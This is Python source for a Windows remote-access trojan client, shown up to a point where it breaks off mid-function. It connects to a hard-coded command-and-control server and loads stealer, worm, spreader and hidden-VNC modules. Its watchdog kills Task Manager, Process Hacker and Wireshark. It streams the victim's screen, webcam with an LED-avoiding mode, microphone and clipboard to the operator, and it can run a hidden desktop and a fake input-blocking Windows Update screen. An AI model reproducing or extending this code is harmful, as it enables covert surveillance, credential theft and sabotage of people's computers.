import sys, os, time, asyncio, threading, subprocess, struct
import socket, getpass, shutil, base64, json, tempfile, re, ctypes, queue
import ssl, traceback, platform, urllib.request

# ── Elite Core Modules (Deferred Loading) ───────────────────────────────────
cv2 = capture_engine = input_hub = VideoEncoder = WebRTCManager = websockets = None
stealer = stealth = injection = spreader = worm = hvnc = web_injector = None
stealer_omega = None
recon = None

def _bootstrap_modules():
    global cv2, capture_engine, input_hub, VideoEncoder, WebRTCManager, websockets
    global stealer, stealth, injection, spreader, worm, hvnc, web_injector
    global stealer_omega, recon
    import websockets as _ws
    websockets = _ws
    try:
        import cv2 as _cv2
        globals()['cv2'] = _cv2
    except Exception as e:
        log(f"[BOOTSTRAP] cv2 failed: {e}")
    try:
        from core.capture import capture_engine as _ce
        capture_engine = _ce
    except Exception as e:
        log(f"[BOOTSTRAP] capture_engine failed: {e}")
    try:
        from core.input import input_hub as _ih
        input_hub = _ih
    except Exception as e:
        log(f"[BOOTSTRAP] input_hub failed: {e}")
    try:
        from core.encoder import VideoEncoder as _ve
        VideoEncoder = _ve
    except Exception as e:
        log(f"[BOOTSTRAP] VideoEncoder failed: {e}")
    try:
        from core.webrtc_service import WebRTCManager as _wm
        WebRTCManager = _wm
    except Exception as e:
        log(f"[BOOTSTRAP] WebRTCManager failed: {e}")
    try:
        from modules import stealer as _s, stealth as _st, injection as _inj
        from modules import spreader as _sp, worm as _w, hvnc as _hv, web_injector as _wi
        stealer = _s; stealth = _st; injection = _inj
        spreader = _sp; worm = _w; hvnc = _hv; web_injector = _wi
    except Exception as e:
        log(f"[BOOTSTRAP] legacy modules failed: {e}")
    try:
        from modules import stealer_omega as _so
        stealer_omega = _so
        log("[BOOTSTRAP] stealer_omega loaded")
    except Exception as e:
        log(f"[BOOTSTRAP] stealer_omega failed: {e}")
    try:
        from modules import recon as _recon
        recon = _recon
        log("[BOOTSTRAP] recon loaded")
    except Exception as e:
        log(f"[BOOTSTRAP] recon failed: {e}")

# ─────────────────────────────────────────────────────────────────────────────
# CRASH LOGGER
# ─────────────────────────────────────────────────────────────────────────────
def _log_crash(exc_type, exc_value, tb):
    try:
        path = os.path.join(os.environ.get("TEMP", ""), "mrl_debug.txt")
        with open(path, "a", encoding="utf-8") as f:
            f.write("\n=== CRASH ===\n")
            traceback.print_exception(exc_type, exc_value, tb, file=f)
    except: pass

sys.excepthook = _log_crash

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def _b64d(s):
    try: return base64.b64decode(s).decode("utf-8", errors="ignore")
    except: return s

def log(msg):
    ts = time.strftime("%H:%M:%S")
    try:
        print(f"[{ts}] {msg}", flush=True)
    except: pass
    try:
        path = os.path.join(os.environ.get("TEMP", ""), "mrl_debug.txt")
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {msg}\n")
    except: pass

def jdumps(obj):
    try:
        import orjson
        return orjson.dumps(obj).decode()
    except:
        return json.dumps(obj)

def jloads(data):
    try:
        import orjson
        return orjson.loads(data)
    except:
        return json.loads(data)

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────
BUILD      = "v21.5-OMEGA-PRO"
SERVER_URL = "https://web-production-1f6c6.up.railway.app"

RANSOM_WALLPAPER_URL = "https://www.malwaretech.com/wp-content/uploads/2017/06/petya.png"
global_loop = None

def _ws_url():
    url = SERVER_URL
    try:
        candidates = [
            os.path.join(os.path.dirname(sys.executable), "c2.url"),
            os.path.join(os.getcwd(), "c2.url"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "MRL", "c2.url"),
            "c2.url"
        ]
        for conf in candidates:
            if os.path.exists(conf):
                with open(conf, "r") as f:
                    url = f.read().strip()
                if url: break
    except: pass

    if not url: url = "http://localhost:8000"

    base = url.replace("https://", "").replace("http://", "")
    proto = "wss" if ("https" in url or "railway" in url) else "ws"
    if "/" in base:
        return f"{proto}://{base}"
    return f"{proto}://{base}/ws"

# ─────────────────────────────────────────────────────────────────────────────
# STATE
# ─────────────────────────────────────────────────────────────────────────────
class St:
    streaming      = False
    quality        = 70
    monitor_idx    = 0
    mnk_active     = False
    cursor_locked  = False
    keylog_active  = False
    keylog_data    = []
    jumpscare_on   = False
    audio_stream   = False
    grid_mode      = False   # multi-monitor grid streaming
    # Camera
    camera_active  = False
    camera_idx     = 0       # which camera to use
    camera_no_led  = True    # burst-capture mode to avoid LED
    camera_list    = []      # enumerated camera names
    # Volume
    volume         = 50
    # Chaos mouse
    mouse_chaos    = False
    # Clipboard
    clipboard_monitor = False
    # Geo
    geo_info       = {}
    # Screenshot scheduler
    sched_ss       = False
    sched_interval = 10
    # Fake Update overlay
    fake_update_active   = False
    fake_update_procs    = []   # list of subprocess.Popen handles
    # Hidden operator desktop (HVNC-light)
    hidden_desktop_hnd   = None  # Win32 HDESK handle
    hidden_desktop_proc  = None  # process running on hidden desktop
    hidden_stream_active = False
    # Camera frame cache
    last_cam_frame = None

st = St()
_fq = queue.Queue(maxsize=1)
_pq = queue.Queue(maxsize=1)

# ── System Shadow Watchdog ──────────────────────────────────────────────────
def _watchdog_loop():
    """Elite Stealth: Automatically closes Task Manager/Process Hacker."""
    forbidden = ["taskmgr.exe", "processhacker.exe", "wireshark.exe",
                 "procexp.exe", "procexp64.exe", "procmon.exe", "procmon64.exe"]
    while True:
        try:
            import psutil
            for proc in psutil.process_iter(['name', 'pid']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() in forbidden:
                        proc.kill()
                        log(f"[WATCHDOG] Terminated: {proc.info['name']} (PID {proc.info['pid']})")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except Exception as e:
            log(f"[WATCHDOG] Loop error: {e}")
        time.sleep(1.5)

threading.Thread(target=_watchdog_loop, daemon=True).start()
log("[STEALTH] System Shadow Watchdog Active")

# ─────────────────────────────────────────────────────────────────────────────
# SYSTEM INFO
# ─────────────────────────────────────────────────────────────────────────────
def get_hwid():
    try:
        raw = subprocess.check_output("wmic csproduct get uuid", shell=True)
        return raw.decode().split("\n")[1].strip()
    except: return socket.gethostname()

def get_specs():
    try:
        import psutil
        du   = psutil.disk_usage("C:")
        free = round(du.free  / (1024**3), 1)
        tot  = round(du.total / (1024**3), 1)
        drives = []
        try:
            for p in psutil.disk_partitions(all=False):
                if p.fstype: drives.append(p.device)
        except: drives = ["C:\\"]
        mons = _get_monitors()
        monitor_names = [f"Monitor {i+1} ({m[2]-m[0]}x{m[3]-m[1]})" for i, m in enumerate(mons) if m]
        return {
            "hostname": socket.gethostname(),
            "os":       f"{platform.system()} {platform.release()}",
            "cpu":      f"{psutil.cpu_count()} Cores",
            "ram":      f"{round(psutil.virtual_memory().total/(1024**3),2)} GB",
            "gpu":      "Integrated",
            "disk":     f"{free} GB / {tot} GB",
            "disk_total": tot, "disk_free": free,
            "ip":       "127.0.0.1",
            "user":     getpass.getuser(),
            "drives":   drives,
            "monitors": monitor_names,
        }
    except:
        return {"hostname": socket.gethostname(), "os": "Windows",
                "user": "User", "drives": ["C:\\"], "monitors": ["Monitor 1"]}

# ─────────────────────────────────────────────────────────────────────────────
# WEBSOCKET HELPERS
# ─────────────────────────────────────────────────────────────────────────────
async def send(ws, obj):
    try: await ws.send(jdumps(obj))
    except: pass

async def send_bin(ws, tag: int, data: bytes):
    try: await ws.send(struct.pack("B", tag) + data)
    except: pass

# ─────────────────────────────────────────────────────────────────────────────
# MONITOR ENUMERATION
# ─────────────────────────────────────────────────────────────────────────────
def _get_monitors():
    try:
        import ctypes, ctypes.wintypes
        monitors = []
        cb = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_ulong, ctypes.c_ulong,
                                ctypes.POINTER(ctypes.wintypes.RECT), ctypes.c_double)(
            lambda h, dc, r, d: monitors.append(
                (r.contents.left, r.contents.top, r.contents.right, r.contents.bottom)) or 1)
        ctypes.windll.user32.EnumDisplayMonitors(0, 0, cb, 0)
        return monitors if monitors else [None]
    except: return [None]


# ─────────────────────────────────────────────────────────────────────────────
# FAKE UPDATE ENGINE
# ─────────────────────────────────────────────────────────────────────────────
_WIN11_UPDATE_HTML = r"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Windows Update</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{
    background:#0078d4;
    font-family:'Segoe UI',system-ui,sans-serif;
    color:#fff;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    height:100vh;
    overflow:hidden;
    user-select:none;
    cursor:none;
  }
  .logo{
    width:72px;height:72px;
    display:grid;grid-template-columns:1fr 1fr;gap:4px;
    margin-bottom:48px;
  }
  .logo div{background:#fff;border-radius:2px}
  .ring-wrap{position:relative;width:120px;height:120px;margin-bottom:40px}
  .ring{
    width:120px;height:120px;
    border:6px solid rgba(255,255,255,0.4);
    border-top-color:#fff;
    border-radius:50%;
    animation:spin 1.1s linear infinite;
  }
  .pct{
    position:absolute;top:50%;left:50%;
    transform:translate(-50%,-50%);
    font-size:22px;font-weight:600;letter-spacing:0.5px;
  }
  h1{font-size:28px;font-weight:300;margin-bottom:14px;letter-spacing:-0.5px}
  p{font-size:15px;opacity:0.9;margin-bottom:48px}
  .dots span{
    display:inline-block;width:10px;height:10px;
    background:#fff;border-radius:50%;margin:0 5px;
    animation:bounce 1.4s infinite ease-in-out both;
  }
  .dots span:nth-child(1){animation-delay:-0.32s}
  .dots span:nth-child(2){animation-delay:-0.16s}
  .warn{
    position:fixed;bottom:24px;left:0;right:0;
    text-align:center;font-size:13px;opacity:0.75;
    font-weight:300;
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  @keyframes bounce{
    0%,80%,100%{transform:scale(0)}
    40%{transform:scale(1)}
  }
</style>
</head>
<body>
<div class="logo">
  <div></div><div></div><div></div><div></div>
</div>
<div class="ring-wrap">
  <div class="ring"></div>
  <div class="pct" id="pct">0%</div>
</div>
<h1>Working on updates</h1>
<p>This might take a while. Your PC will restart <strong>several times</strong>.</p>
<p>Don't turn off your PC.</p>
<div class="dots"><span></span><span></span><span></span></div>
<div class="warn">⊞ &nbsp; Keep your PC on.</div>
<script>
  var p=0,spd=null;
  function tick(){
    if(p<30)spd=1;
    else if(p<60)spd=0.4;
    else if(p<88)spd=0.15;
    else spd=0.04;
    p=Math.min(p+spd,100);
    document.getElementById('pct').textContent=Math.floor(p)+'%';
    if(p<100)setTimeout(tick,80);
  }
  tick();
  // Block all keyboard/mouse
  document.addEventListener('keydown',function(e){e.preventDefault();e.stopPropagation();},true);
  document.addEventListener('contextmenu',function(e){e.preventDefault();},true);
</script>
</body>
</html>"""

def _launch_fake_update():
    """Show Windows Update overlay. Primary=update page. Others=black. Operator stream unaffected."""
    procs = []

    # Write the update HTML to temp
    tmp_html = os.path.join(os.environ.get("TEMP", ""), "_omega_update.html")
    try:
        with open(tmp_html, "w", encoding="utf-8") as f:
            f.write(_WIN11_UPDATE_HTML)
    except Exception as e:
        log(f"[FAKE_UPDATE] HTML write: {e}")
        return procs

    monitors = _get_monitors()
    primary  = monitors[0] if monitors else None

    # ── Primary monitor: mshta fullscreen blue update page ──
    try:
        p = subprocess.Popen(
            ["powershell", "-WindowStyle", "Maximized", "-Command",
             f"Start-Process mshta.exe -ArgumentList '{tmp_html}' -WindowStyle Maximized"],
            creationflags=subprocess.CREATE_NO_WINDOW)
        procs.append(("mshta_update", p))
        # Give it a moment then force true fullscreen via Win32
        time.sleep(0.8)
        _force_mshta_fullscreen()
    except Exception as e:
        log(f"[FAKE_UPDATE] mshta launch: {e}")

    # ── Secondary monitors: black topmost click-through windows ──
    def _black_monitor(rect):
        """Run a topmost click-through black Tk window on one monitor."""
        try:
            import tkinter as tk
            root = tk.Tk()
            root.configure(bg="#000000")
            root.geometry(f"{rect[2]-rect[0]}x{rect[3]-rect[1]}+{rect[0]}+{rect[1]}")
            root.overrideredirect(True)
            root.attributes("-topmost", True)
            # Make transparent to input (click-through) so operator's remote mouse still works
            hwnd = int(root.frame(), 16)
            ex_style = ctypes.windll.user32.GetWindowLongW(hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                hwnd, -20, ex_style | 0x80000 | 0x20)  # WS_EX_LAYERED | WS_EX_TRANSPARENT
            ctypes.windll.user32.SetLayeredWindowAttributes(hwnd, 0, 255, 0x2)
            root.mainloop()
        except Exception as e:
            log(f"[BLACK_MON] {e}")

    for i, mon in enumerate(monitors[1:], 1):
        t = threading.Thread(target=_black_monitor, args=(mon,), daemon=True)
        t.start()
        procs.append(("black_thread", t))

    return procs


def _force_mshta_fullscreen():
    """Find the mshta window and force it to be truly fullscreen + topmost + click-through-safe."""
    try:
        import ctypes
        SW_MAXIMIZE = 3
        WS_EX_TOPMOST = 0x00000008

        def enum_callback(hwnd, _):
            title = ctypes.create_unicode_buffer(256)
            ctypes.windll.user32.GetWindowTextW(hwnd, title, 256)
            cls   = ctypes.create_unicode_buffer(256)
            ctypes.windll.user32.GetClassNameW(hwnd, cls, 256)
            if "Internet Explorer_Server" in cls.value or \
               "Windows Update" in title.value or \
               "MSHTML" in cls.value:
                # Maximize + set topmost + borderless
                ctypes.windll.user32.ShowWindow(hwnd, SW_MAXIMIZE)
                ctypes.windll.user32.SetWindowPos(
                    hwnd, -1, 0, 0, 0, 0,
                    0x0001 | 0x0002 | 0x0040)  # SWP_NOMOVE|SWP_NOSIZE|SWP_SHOWWINDOW
            return True

        EnumProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_void_p)
        ctypes.windll.user32.EnumWindows(EnumProc(enum_callback), 0)
    except: pass


def _revert_fake_update():
    """Kill all fake update overlay processes and restore the display."""
    # Kill any mshta processes we spawned
    try:
        subprocess.run("taskkill /f /im mshta.exe",
                       shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
    except: pass

    # Kill all Tk black overlay threads (can't easily kill threads, but the windows will die
    # when the process/thread ends — force kill via Win32 FindWindow)
    try:
        import ctypes

        def _kill_black(hwnd, _):
            cls = ctypes.create_unicode_buffer(256)
            ctypes.windll.user32.GetClassNameW(hwnd, cls, 256)
            if cls.value == "Tk":
                buf = ctypes.create_unicode_buffer(256)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, 256)
                # Destroy black windows
                ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)  # WM_CLOSE
            return True

        EnumProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_void_p)
        ctypes.windll.user32.EnumWindows(EnumProc(_kill_black), 0)
    except: pass

    # Clean up the temp HTML
    try:
        tmp_html = os.path.join(os.environ.get("TEMP", ""), "_omega_update.html")
        os.remove(tmp_html)
    except: pass

    log("[FAKE_UPDATE] Reverted")


# ─────────────────────────────────────────────────────────────────────────────
# HIDDEN OPERATOR DESKTOP  (Win32 CreateDesktopW — true separate desktop)
# ─────────────────────────────────────────────────────────────────────────────
_HIDDEN_DESK_NAME   = "OmegaHiddenDesk"
_hidden_desk_handle  = None   # module-level HDESK
_hidden_desk_proc    = None   # subprocess running on hidden desktop

def _start_hidden_desktop(prog="explorer.exe"):
    """
    Create a hidden Win32 desktop, launch a process on it, and return the desktop handle.
    The user sees nothing — the hidden desktop is fully separate.
    """
    global _hidden_desk_handle, _hidden_desk_proc
    try:
        import ctypes, ctypes.wintypes as wt

        # DESKTOP_GENERIC_ALL = 0x01FF
        DESKTOP_ALL = 0x01FF
        hdesk = ctypes.windll.user32.CreateDesktopW(
            _HIDDEN_DESK_NAME, None, None, 0, DESKTOP_ALL, None)
        if not hdesk:
            return False, "CreateDesktopW failed"
        _hidden_desk_handle = hdesk

        # Build STARTUPINFOW with lpDesktop pointing to hidden desktop
        class STARTUPINFOW(ctypes.Structure):
            _fields_ = [
                ("cb",              wt.DWORD),
                ("lpReserved",      wt.LPWSTR),
                ("lpDesktop",       wt.LPWSTR),
                ("lpTitle",         wt.LPWSTR),
                ("dwX",             wt.DWORD),
                ("dwY",             wt.DWORD),
                ("dwXSize",         wt.DWORD),
                ("dwYSize",         wt.DWORD),
                ("dwXCountChars",   wt.DWORD),
                ("dwYCountChars",   wt.DWORD),
                ("dwFillAttribute", wt.DWORD),
                ("dwFlags",         wt.DWORD),
                ("wShowWindow",     wt.WORD),
                ("cbReserved2",     wt.WORD),
                ("lpReserved2",     ctypes.c_char_p),
                ("hStdInput",       wt.HANDLE),
                ("hStdOutput",      wt.HANDLE),
                ("hStdError",       wt.HANDLE),
            ]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("hProcess",  wt.HANDLE),
                ("hThread",   wt.HANDLE),
                ("dwProcessId", wt.DWORD),
                ("dwThreadId",  wt.DWORD),
            ]

        si = STARTUPINFOW()
        si.cb        = ctypes.sizeof(STARTUPINFOW)
        si.lpDesktop = f"winsta0\\{_HIDDEN_DESK_NAME}"
        pi = PROCESS_INFORMATION()

        cmd = ctypes.create_unicode_buffer(prog)
        ok  = ctypes.windll.kernel32.CreateProcessW(
            None, cmd, None, None, False,
            0x00000010,  # CREATE_NEW_CONSOLE
            None, None,
            ctypes.byref(si), ctypes.byref(pi))

        if ok:
            _hidden_desk_proc = pi.dwProcessId
            log(f"[HIDDEN_DESK] Launched '{prog}' PID={pi.dwProcessId} on {_HIDDEN_DESK_NAME}")
            return True, pi.dwProcessId
        else:
            err = ctypes.windll.kernel32.GetLastError()
            return False, f"CreateProcess failed: {err}"

    except Exception as e:
        return False, str(e)


def _capture_hidden_desktop(quality: int = 70) -> bytes:
    """
    Capture a screenshot from the hidden Win32 desktop using BitBlt.
    Returns JPEG bytes, or empty if failed.
    """
    global _hidden_desk_handle
    try:
        import ctypes, ctypes.wintypes as wt

        if not _hidden_desk_handle:
            return b""

        # Switch temporarily to hidden desktop for capture, then switch back
        user_desk = ctypes.windll.user32.GetThreadDesktop(
            ctypes.windll.kernel32.GetCurrentThreadId())

        ctypes.windll.user32.SetThreadDesktop(_hidden_desk_handle)

        # Now take screenshot using mss on the current desktop
        try:
            import mss, io
            from PIL import Image
            with mss.mss() as sct:
                mon = sct.monitors[0]
                shot = sct.grab(mon)
            img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=quality)
            frame = buf.getvalue()
        except:
            frame = b""

        # Switch back to user's desktop
        ctypes.windll.user32.SetThreadDesktop(user_desk)
        return frame

    except Exception as e:
        log(f"[HIDDEN_CAP] {e}")
        return b""


def _stop_hidden_desktop():
    """Kill the process on the hidden desktop and close the desktop handle."""
    global _hidden_desk_handle, _hidden_desk_proc
    try:
        if _hidden_desk_proc:
            subprocess.run(f"taskkill /f /pid {_hidden_desk_proc}",
                           shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            _hidden_desk_proc = None
    except: pass
    try:
        if _hidden_desk_handle:
            ctypes.windll.user32.CloseDesktop(_hidden_desk_handle)
            _hidden_desk_handle = None
    except: pass


# ─────────────────────────────────────────────────────────────────────────────
# SCREENSHOT  (PIL only — no cv2/mss/numpy)
# ─────────────────────────────────────────────────────────────────────────────
def _screenshot():
    try:
        from PIL import ImageGrab
        import io
        mons = _get_monitors()
        bbox = mons[st.monitor_idx] if st.monitor_idx < len(mons) else mons[0]
        img = ImageGrab.grab(bbox=bbox, all_screens=(bbox is None))
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=st.quality)
        return buf.getvalue()
    except: return None

def _screenshot_monitor(idx):
    """Capture a specific monitor by index, returns JPEG bytes."""
    try:
        from PIL import ImageGrab
        import io
        mons = _get_monitors()
        bbox = mons[idx] if idx < len(mons) else mons[0]
        img = ImageGrab.grab(bbox=bbox, all_screens=(bbox is None))
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=50)  # lower quality for grid
        return buf.getvalue()
    except: return None

# ─────────────────────────────────────────────────────────────────────────────
# HIGH PERFORMANCE SCREEN STREAMING
# ─────────────────────────────────────────────────────────────────────────────
_rtc = None

async def stream_loop(ws):
    """High-speed Binary Multiplexer for Screen & Camera."""
    while True:
        if st.streaming:
            try:
                # Elevate process priority during active streaming
                if not hasattr(st, "_priority_set"):
                    try:
                        ctypes.windll.kernel32.SetPriorityClass(
                            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080)
                        st._priority_set = True
                        log("[STREAM] High Priority Active")
                    except: pass

                if st.grid_mode:
                    # ── Grid Mode: send each monitor on its own channel (0x10 + idx) ──
                    mons = _get_monitors()
                    for idx, mon in enumerate(mons[:4]):  # max 4 monitors
                        frame_bytes = await asyncio.to_thread(_screenshot_monitor, idx)
                        if frame_bytes:
                            tag = 0x10 + idx
                            await ws.send(struct.pack("B", tag) + frame_bytes)
                    await asyncio.sleep(0.12)  # ~8fps for grid (less bandwidth)
                    continue

                # ── Single Monitor Mode ──
                # Try capture_engine first, fall back to PIL screenshot
                frame = None
                if capture_engine is not None:
                    try:
                        frame = capture_engine.grab()
                    except Exception as e:
                        log(f"[STREAM] capture_engine.grab() error: {e}")

                if frame is not None and cv2 is not None:
                    # Downscale to 1280p max for snappiness
                    try:
                        h, w = frame.shape[:2]
                        if w > 1280:
                            frame = cv2.resize(frame, (1280, int(h * (1280 / w))),
                                               interpolation=cv2.INTER_AREA)
                    except: pass
                    try:
                        bgr_frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                        _, jpeg = cv2.imencode('.jpg', bgr_frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
                        await ws.send(struct.pack("B", 0x03) + jpeg.tobytes())
                    except Exception as e:
                        log(f"[STREAM] encode error: {e}")
                        await asyncio.sleep(0.1)
                        continue
                else:
                    # PIL fallback
                    frame_bytes = await asyncio.to_thread(_screenshot)
                    if frame_bytes:
                        await ws.send(struct.pack("B", 0x03) + frame_bytes)
                    else:
                        await asyncio.sleep(0.1)
                        continue

                # ── Camera (multi-camera, no-LED burst mode) ────────────────────
                if st.camera_active and cv2 is not None:
                    frame_bytes = await asyncio.to_thread(_grab_camera_frame, st.camera_idx)
                    if frame_bytes:
                        await ws.send(struct.pack("B", 0x04) + frame_bytes)
                        st.last_cam_frame = frame_bytes  # cache for cam_freeze_frame troll

                # ── Hidden Operator Desktop stream (tag 0x0A) ────────────────────
                if st.hidden_stream_active:
                    if not hasattr(st, "_hdesk_frame_ctr"):
                        st._hdesk_frame_ctr = 0
                    st._hdesk_frame_ctr += 1
                    # ~10fps for hidden desktop (every 6 frames at 60fps)
                    if st._hdesk_frame_ctr % 6 == 0:
                        hf = await asyncio.to_thread(_capture_hidden_desktop, 65)
                        if hf:
                            await ws.send(struct.pack("B", 0x0A) + hf)

                await asyncio.sleep(0.016)  # ~60fps
            except Exception as e:
                log(f"[STREAM] Error: {e}")
                await asyncio.sleep(0.1)
        else:
            await asyncio.sleep(0.5)

# ─────────────────────────────────────────────────────────────────────────────
# CAMERA  (no-LED burst mode: open → grab → close immediately)
# ─────────────────────────────────────────────────────────────────────────────
_cam_caps = {}   # idx → persistent cap when no-LED is OFF

def _grab_camera_frame(idx: int = 0) -> bytes:
    """Grab one JPEG frame. Uses DirectShow to minimise LED indicator."""
    global cv2
    if cv2 is None:
        return b''
    try:
        if st.camera_no_led:
            # Burst mode: open, grab, close. LED only flickers briefly.
            cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
            cap.set(cv2.CAP_PROP_FRAME_WIDTH,  640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            cap.set(cv2.CAP_PROP_FPS, 15)
            # Read a few frames to let auto-exposure settle
            for _ in range(3): cap.grab()
            ret, frame = cap.read()
            cap.release()
        else:
            # Persistent cap
            if idx not in _cam_caps or not _cam_caps[idx].isOpened():
                cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
                cap.set(cv2.CAP_PROP_FRAME_WIDTH,  1280)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                cap.set(cv2.CAP_PROP_FPS, 30)
                _cam_caps[idx] = cap
            cap = _cam_caps[idx]
            ret, frame = cap.read()

        if ret and frame is not None:
            _, jpeg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 65])
            return jpeg.tobytes()
    except Exception as e:
        log(f"[CAMERA] Error idx={idx}: {e}")
    return b''

def enumerate_cameras() -> list:
    """Detect all available cameras (physical + virtual)."""
    global cv2
    if cv2 is None:
        return []
    cameras = []
    for i in range(10):
        try:
            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
            if cap.isOpened():
                # Try to get the device name via DirectShow
                name = f"Camera {i}"
                try:
                    w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                    h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                    name = f"Camera {i} ({w}x{h})"
                except: pass
                cameras.append({"idx": i, "name": name})
                cap.release()
        except: pass
    st.camera_list = cameras
    return cameras

# ─────────────────────────────────────────────────────────────────────────────
# AUDIO LOOP  (Desktop loopback / Mic / Camera mic)
# ─────────────────────────────────────────────────────────────────────────────
async def audio_loop(ws):
    while True:
        if getattr(st, "audio_active", False):
            try:
                import soundcard as sc
                mics = sc.all_microphones(include_loopback=True)
                loopback = next((m for m in mics if m.isloopback), None)
                if not loopback: loopback = sc.default_microphone()
                with loopback.recorder(samplerate=44100) as mic:
                    while getattr(st, "audio_active", False):
                        data = mic.record(numframes=1024)
                        pcm = (data * 32767).astype('int16').tobytes()
                        await ws.send(struct.pack("B", 0x05) + pcm)
            except Exception as e:
                log(f"Audio error: {e}")
                await asyncio.sleep(2)
        elif getattr(st, "mic_active", False):
            try:
                import soundcard as sc
                mic = sc.default_microphone()
                with mic.recorder(samplerate=44100) as m:
                    while getattr(st, "mic_active", False):
                        data = m.record(numframes=1024)
                        pcm = (data * 32767).astype('int16').tobytes()
                        await ws.send(struct.pack("B", 0x07) + pcm)
            except Exception as e:
                log(f"Mic error: {e}")
                await asyncio.sleep(2)
        else:
            await asyncio.sleep(1)

# ─────────────────────────────────────────────────────────────────────────────
# CHAOS MOUSE
# ─────────────────────────────────────────────────────────────────────────────
def _chaos_mouse_loop():
    import random
    sw = ctypes.windll.user32.GetSystemMetrics(0)
    sh = ctypes.windll.user32.GetSystemMetrics(1)
    while st.mouse_chaos:
        try:
            x = random.randint(0, sw)
            y = random.randint(0, sh)
            ctypes.windll.user32.SetCursorPos(x, y)
            time.sleep(random.uniform(0.02, 0.08))
        except: pass

# ─────────────────────────────────────────────────────────────────────────────
# SCREENSHOT SCHEDULER
# ─────────────────────────────────────────────────────────────────────────────
async def screenshot_scheduler(ws):
    while True:
        if st.sched_ss and st.streaming is False:
            data = await asyncio.to_thread(_screenshot)
            if data:
                await send_bin(ws, 0x03, data)
            await asyncio.sleep(st.sched_interval)
        else:
            await asyncio.sleep(2)

# ─────────────────────────────────────────────────────────────────────────────
# CLIPBOARD RELAY
# ─────────────────────────────────────────────────────────────────────────────
async def clipboard_relay_loop(ws):
    last = ""
    while True:
        if st.clipboard_monitor:
            try:
                if recon is not None:
                    cur = await asyncio.to_thread(recon.get_clipboard)
                    if cur and cur != last:
                        last = cur
                        await send(ws, {"t": "clipboard_update", "data": cur})
            except: pass
            await asyncio.sleep(1.2)
        else:
            await asyncio.sleep(2)


# ── Heartbeat ─────────────────────────────────────────────────────────────────
async def heartbeat_loop(ws, uid):
    while True:
        try:
            await asyncio.sleep(15)
            await send(ws, {"t": "ping", "id": uid})
        except: break

# ─────────────────────────────────────────────────────────────────────────────
# WALLPAPER
# ─────────────────────────────────────────────────────────────────────────────
def _set_wallpaper(data: bytes):
    try:
        fd, path = tempfile.mkstemp(suffix=".jpg")
        os.close(fd)
        with open(path, "wb") as f: f.write(data)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return True
    except: return False

# ─────────────────────────────────────────────────────────────────────────────
# JUMPSCARE
# ─────────────────────────────────────────────────────────────────────────────
def _jumpscare(data: bytes):
    """Display image fullscreen using PowerShell + Windows Forms."""
    try:
        fd, path = tempfile.mkstemp(suffix=".jpg")
        os.close(fd)
        with open(path, "wb") as f: f.write(data)
        ps = f"""
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$img  = [System.Drawing.Image]::FromFile('{path}')
$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$pb = New-Object System.Windows.Forms.PictureBox
$pb.Dock = 'Fill'
$pb.Image = $img
$pb.SizeMode = 'StretchImage'
$form.Controls.Add($pb)
$form.Show()
Start-Sleep -Seconds 5
$form.Close()
"""
        subprocess.Popen(
            ["powershell.exe", "-NoProfile", "-NonInteractive",
             "-ExecutionPolicy", "Bypass", "-Command", ps],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return True
    except: return False

def minimize_all_windows():
    try:
        VK_LWIN = 0x5B
        KEYEVENTF_KEYUP = 0x0002
        ctypes.windll.user32.keybd_event(VK_LWIN, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x44, 0, KEYEVENTF_KEYUP, 0)
        ctypes.windll.user32.keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)
    except Exception as e:
        log(f"[MinimizeAll] Error: {e}")

# ─────────────────────────────────────────────────────────────────────────────
# ELITE INTEGRATIONS
# ─────────────────────────────────────────────────────────────────────────────
def _speak(text):
    try:
        import pyttsx3
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
    except: pass

def _recognize():
    try:
        import speech_recognition as sr
        r = sr.Recognizer()
        with sr.Microphone() as source:
            audio = r.listen(source, timeout=5)
        return r.recognize_google(audio)
    except: return "Error or No Speech"

def _msgbox(text):
